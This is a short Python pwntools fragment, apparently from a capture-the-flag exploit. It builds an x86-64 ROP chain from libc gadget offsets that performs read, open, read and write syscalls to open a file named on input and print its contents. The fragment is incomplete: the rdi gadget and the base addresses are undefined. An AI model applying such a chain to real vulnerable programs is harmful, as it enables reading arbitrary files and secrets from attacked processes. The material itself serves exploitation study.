from pwn import *

rax = libc_base + 0x45eb0
rsi = libc_base + 0x2be51
rdx_rbx = libc_base + 0x904a9
syscall = libc_base + 0x1147E0

# read
Rop = p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(Elf_base + 0x4090) + p64(rdx_rbx) + p64(0x4)*2 + p64(syscall)
# open
Rop+= p64(rax) + p64(0x2) + p64(rdi) + p64(Elf_base + 0x4090) + p64(rsi) + p64(0x0) + p64(rdx_rbx) + p64(0x0)*2 + p64(syscall)
# read
Rop+= p64(rax) + p64(0x0) + p64(rdi) + p64(3) + p64(rsi) + p64(Elf_base + 0x4090) + p64(rdx_rbx) + p64(0x100)*2 + p64(syscall)
# write
Rop+= p64(rax) + p64(0x1) + p64(rdi) + p64(1) + p64(rsi) + p64(Elf_base + 0x4090) + p64(rdx_rbx) + p64(0x70)*2 + p64(syscall)